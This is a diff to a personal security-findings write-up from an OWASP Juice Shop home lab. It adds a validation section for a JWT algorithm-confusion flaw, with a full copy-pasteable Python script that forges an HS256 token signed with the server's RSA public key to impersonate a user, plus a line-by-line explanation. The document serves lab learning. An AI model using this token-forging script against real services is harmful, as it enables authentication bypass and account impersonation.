@@ -1,6 +1,6 @@
 # Security Findings 
 
-Contains security findings identified and validated during testing of the isolated OWASP Juice Shop home lab.
+Contains security findings identified and validated during testing of the OWASP Juice Shop home lab.
 
 Testing primarily followed a black-box approach, using application responses to investigate and validate suspected vulnerabilities. Source code analysis was used selectively where it provided additional context.
 
@@ -691,6 +691,109 @@ The main problem is that **the server blindly trusts the user-controlled `alg` c
 The application normally uses an asymmetric algorithm (RS256), meaning it signs tokens with a secret private key and verifies them with a public key. However, if I change the header to a symmetric algorithm (HS256), the server gets confused and switches to a password-checking mode. Because the backend code is hardcoded to pass the public key file into the verification function, it mistakenly treats its own public key text as the HMAC password. Since this key is public, an attacker can use it to sign a forged token and impersonate any user.
 
 #### Validation
+I took what I learned from reading PortSwigger and WorkOS and used a simple Python script template instead. By using basic programming blocks (`hmac` and `base64`), the script put the pieces of the token together step-by-step. I set the target email to `rsa_lord@juice-sh.op` and made sure the script stripped out any extra spaces so the format matched exactly what the Juice Shop backend database looks for.
+
+<details>
+<summary>🛠️ <b>View Copy-Pasteable Exploit Code</b></summary>
+
+```python
+import base64
+import hmac
+import hashlib
+import json
+ 
+# Standard header specifying the algorithm confusion attack
+header = {"alg": "HS256", "typ": "JWT"}
+ 
+# Payload using the exact data format Juice Shop expects
+payload = {
+    "data": {
+        "email": "rsa_lord@juice-sh.op"
+    }
+} 
+ 
+# Base64url encoding helper function
+def base64url_encode(data):
+    encoded = base64.urlsafe_b64encode(data)
+    return encoded.decode('utf-8').rstrip('=')
+ 
+# The full public key 
+public_key_bytes = b"""-----BEGIN RSA PUBLIC KEY-----
+MIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=
+-----END RSA PUBLIC KEY-----"""
+ 
+# Pack and encode without extra spaces to match backend serialization
+header_encoded = base64url_encode(json.dumps(header).encode('utf-8'))
+payload_encoded = base64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
+signing_input = f"{header_encoded}.{payload_encoded}".encode('utf-8')
+ 
+# Cryptographically sign via HMAC-SHA256 using the key block as a symmetric password
+signature = hmac.new(public_key_bytes, signing_input, hashlib.sha256).digest()
+signature_encoded = base64url_encode(signature)
+ 
+# Generate final token
+forged_token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"
+print(forged_token)
+```
+
+</details>
+
+##### How the Script Works (Line-by-Line Breakdown)
+These are the standard JSON data objects used when creating a JWT.
+
+```python
+header = {"alg": "HS256", "typ": "JWT"}
+
+payload = {
+    "data": {
+        "email": "rsa_lord@juice-sh.op"
+    }
+}
+```
+
+This sets up a base64 encoding and decoding translation mechanism for our data. Because a JSON Web Token must be a single solid string of letters and numbers to be sent over the internet, the script uses this helper function to turn the plain JSON text into a scrambled web-safe string, translates it into clean text using the UTF-8 dictionary, and removes any extra equal signs (=) from the very end since standard tokens don't allow them.
+
+```python
+def base64url_encode(data):
+    encoded = base64.urlsafe_b64encode(data)
+    return encoded.decode('utf-8').rstrip('=')
+```
+
+The script then uses the provided public RSA key block as an HMAC password.
+
+```python
+public_key_bytes = b"""-----BEGIN RSA PUBLIC KEY-----
+...
+-----END RSA PUBLIC KEY-----"""
+```
+
+Turns data objects into plain text and scrambles them through the base64 function. The setting separators=(',', ':') is used to remove all extra spaces from the text because the web server requires the data to be packed tightly without spacing. Finally, the script glues the scrambled header and payload together with a dot in the middle so they are ready to be signed.
+
+```python
+header_encoded = base64url_encode(json.dumps(header).encode('utf-8'))
+payload_encoded = base64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
+signing_input = f"{header_encoded}.{payload_encoded}".encode('utf-8')
+```
+
+Runs the signature calculation using Python's built-in `hmac` tool. It takes the combined text string, runs it through the SHA-256 cryptographic mode (`hashlib.sha256`), and uses the public key text bytes as the secret password string. The resulting raw hash numbers are then scrambled into a web-safe Base64 text string.
+
+```python
+signature = hmac.new(public_key_bytes, signing_input, hashlib.sha256).digest()
+signature_encoded = base64url_encode(signature)
+```
+
+The final part, takes the scrambled header text, scrambled payload text, and newly forged signature text, and glues them together using dots to build the classic three-part architecture of a valid JSON Web Token (`Header.Payload.Signature`).
+
+```python
+forged_token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"
+```
+
+
+
+
+
+
+
 
 
 
